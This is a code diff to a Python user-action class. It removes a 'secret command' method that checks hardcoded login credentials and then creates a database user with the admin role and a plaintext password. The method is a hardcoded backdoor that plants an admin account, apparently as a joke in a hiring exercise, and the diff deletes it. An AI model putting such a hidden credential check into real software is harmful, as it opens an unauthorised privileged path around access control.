@@ -203,61 +203,7 @@ class UserAction:
             session.close()
             return 'Invalid Login'
     
-    @staticmethod
-    def func_secret_command(login, password):
-
-        session = DataBaseManager.db_switcher()
-
-        if login == 'Profil' and password == 'Software':
-            user = UserValidator(login, password, session)
-            user.auth = True
-
-        if user.auth: 
-            user_data = {
-                'firstname': f'{login} {password}',
-                'telephone_number': '123456789',
-                'email': 'recruitment@profil-software.com',
-                'password': '0123456789',
-                'role': 'admin',
-                'created_at': '2022-04-29',
-                'children' : [
-                    {'name': 'A lot of juniors :D', 'age': 0},
-                ]
-                }
-
-            user = User(user_data)
-            session.add(user)
-            session.commit()
-
-            user = (
-                session
-                .query(User)
-                .filter_by(firstname=f'{login} {password}')
-                .options(joinedload(User.children)) 
-                .first()
-            )
-            session.close()
-
-            childs = ''
-            for child in user.children:
-                childs = childs + f'{child.name},  age: {child.age}'
-
-            result = f"""
-                Welcome in the Database
-
-            Name:\t\t{user.firstname}
-            Phone:\t\t{user.telephone_number}
-            email: \t\t{user.email}
-            password:   \t{user.password}
-            role:\t\t{user.role}
-            since:\t\t{user.created_at}
-            childs:\t\t{childs}
-                    """
-            return result
-        
-        else:
-            session.close()
-            return 'Invalid Login'
+    
 
     
 
